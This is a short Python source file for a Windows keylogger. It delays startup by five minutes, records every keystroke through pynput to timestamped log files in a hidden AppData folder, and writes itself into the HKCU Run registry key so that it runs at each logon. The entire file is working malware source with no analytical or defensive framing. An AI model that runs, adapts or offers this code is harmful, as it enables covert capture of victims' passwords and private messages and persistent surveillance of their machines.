import os
import logging
import time
from datetime import datetime
from pynput.keyboard import Listener
import winreg as reg
import sys
import ctypes

# Function to set the script to run on startup (Registry entry)
def add_to_startup():
    script_path = os.path.abspath(sys.argv[0])  # Get the absolute path of the script
    try:
        key = reg.HKEY_CURRENT_USER
        path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = reg.OpenKey(key, path, 0, reg.KEY_WRITE)
        reg.SetValueEx(reg_key, "Keylogger", 0, reg.REG_SZ, script_path)
        reg.CloseKey(reg_key)
        print("[+] Keylogger added to startup.")
    except Exception as e:
        print(f"[-] Error adding to startup: {e}")

# Function to log keystrokes
def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")

# Wait for 5 minutes before starting the keylogger
time.sleep(300)

# Define log file path
log_dir = os.path.expanduser("~\\AppData\\Roaming\\Keylogs")
if not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = os.path.join(log_dir, f"keylog_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

# Configure logging
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

# Call the function to add to startup (only needs to be done once)
add_to_startup()

# Start listening to the keyboard
with Listener(on_press=on_press) as listener:
    listener.join()
